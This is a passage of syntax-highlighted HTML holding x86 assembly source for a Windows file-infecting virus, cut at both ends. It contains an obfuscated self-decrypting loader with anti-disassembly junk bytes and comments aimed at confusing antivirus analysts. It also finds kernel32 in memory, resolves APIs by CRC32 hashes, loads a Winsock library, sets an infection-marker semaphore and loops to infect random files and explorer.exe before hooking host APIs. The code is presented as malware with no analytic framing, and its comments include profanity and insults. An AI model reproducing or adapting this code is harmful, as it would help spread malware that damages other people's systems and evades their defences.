        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;add edx,[ebp+ecx+0] (?)</span><span class="sc0">
                                        
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">036h</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">23h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;confuse the damned AV'er! (0)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0fh</span><span class="sc0">

        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc3">"Liî"</span><span class="sc0">
</span><span class="sc5">mainkey</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dontyouloveme</span><span class="sc1">;?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f3h</span><span class="sc0">
</span><span class="sc5">dontyouloveme</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ready</span><span class="sc1">;?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
</span><span class="sc5">ready</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">g</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">gg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">genkey</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">decryptmainbody</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0fh</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">14</span><span class="sc0">                              </span><span class="sc1">;decrypt body using checksum</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">hah</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c6h</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">hah</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bbh</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">55h</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">donedecbtd</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">44h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0feh</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0efh</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">createkey</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02fh</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">decryptmainbody</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">

</span><span class="sc5">donedecbtd</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">endcryptedcrypter</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;(this cryptor was crypted... duh! :)</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
                

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">vstart</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;        int     3</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip1numero2</span><span class="sc0">                  </span><span class="sc1">;annoying to da bone! :)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">overaddeip1numero2</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc0">

</span><span class="sc5">addeip1numero2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">overaddeip1numero2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">importedapis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oldedi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     VIRUS API Initialisation starts here    ****</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
                             </span><span class="sc1">;short&amp;sweet (shorter then the original code:P)</span><span class="sc0">
                                      </span><span class="sc1">;-;------.------.--.----.----.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Return adress of call from </span><span class="sc0">
                                        </span><span class="sc1">;CreateProcess              </span><span class="sc0">
</span><span class="sc1">;---------------------------------------;---.--------.------.----.------..---;</span><span class="sc0">
</span><span class="sc5">GetKrnlBaseLoop</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;Get Kernel32 module base adress</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;Scan backward</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Take beginning of PE header</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0f800h</span><span class="sc0">               </span><span class="sc1">;Is it a PE header ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetKrnlBaseLoop</span><span class="sc0">         </span><span class="sc1">;No, forget about it</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Compare current adress with the</span><span class="sc0">
                                        </span><span class="sc1">;address that PE should be loaded at</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetKrnlBaseLoop</span><span class="sc0">         </span><span class="sc1">;Different ? Search again</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
                                                                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;       Here we have ecx pointing to the start of the kernel32DLL in memory</span><span class="sc0">

                                                                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NOF</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">NOFK32</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">functions</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetApis</span><span class="sc0">                         </span><span class="sc1">;Get Kernel32 APIs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virusVsize</span><span class="sc4">+</span><span class="sc2">500</span><span class="sc0">                  </span><span class="sc1">;Virtual Size of Virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_FIXED</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GMEM_ZEROINIT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iGlobalAlloc</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get some mem. for our api-</span><span class="sc0">
                                                </span><span class="sc1">;imports &amp; other (buffer) shit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">returntohost</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">back2real</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oldelta</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;*** mov</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virusVsize</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                                       
                                                    
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                                 
                                                    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FurtherInMem</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;RET to copy in allocated mem.</span><span class="sc0">

</span><span class="sc5">FurtherInMem</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getpointerws32</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WSOCK32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getpointerws32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iLoadLibraryA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;pointer to PE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">078h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;rva exporttable/names</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">         </span><span class="sc1">;pointer to names</span><span class="sc0">
                                        </span><span class="sc1">;ebx points now to name RVA's</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;modulehandle/pointer</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;pointer to name</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ws32icrc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;where to store retrieved APIaddreses</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ws32i</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;*** mov edi,ecx</span><span class="sc0">
                                        </span><span class="sc1">;*** mov     ecx,NOFWS32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NOFWS32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">


</span><span class="sc1">;ESI-names,EDX-crcs,ECX-numberofCRCs,EDI-store</span><span class="sc0">

</span><span class="sc5">checkcrc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crc32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">checkcrc</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;pointer module/handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iGetProcAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">checkcrc</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     Virus initialising done,start threads, runtime infect ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushNameOfSemaphore</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"m00n"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;push offset on stack</span><span class="sc0">
</span><span class="sc5">PushNameOfSemaphore</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Max Count</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Initial Count</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Sec. Attr.</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iCreateSemaphoreA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">endfun</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SemaphoreHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;increase semaphore</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;to max count</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;if already at maxcount error</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;that means we already run</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;semaphore handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iReleaseSemaphore</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;***        or      eax,eax</span><span class="sc0">
</span><span class="sc1">;           jz      AlreadyActive                   ;if error</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">AlreadyActive</span><span class="sc0">

</span><span class="sc1">;        call    startthreads</span><span class="sc0">

</span><span class="sc5">AlreadyActive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SemaphoreHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iCloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">endfun</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">;... Infect at runtime 3 random files &amp; %windir%\explorer.exe</span><span class="sc0">
       </span><span class="sc1">;(LAME! BUG! explorer.exe = running = unwritable! fucker! lifewire=gay)</span><span class="sc0">
       </span><span class="sc1">;looser!!</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">RuntimeFiles</span><span class="sc0">                </span><span class="sc1">;*** mov ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">infectloop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">infectloop</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     Hook the by-host-imported API's     ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;0 = current module (I hope:)</span><span class="sc0">
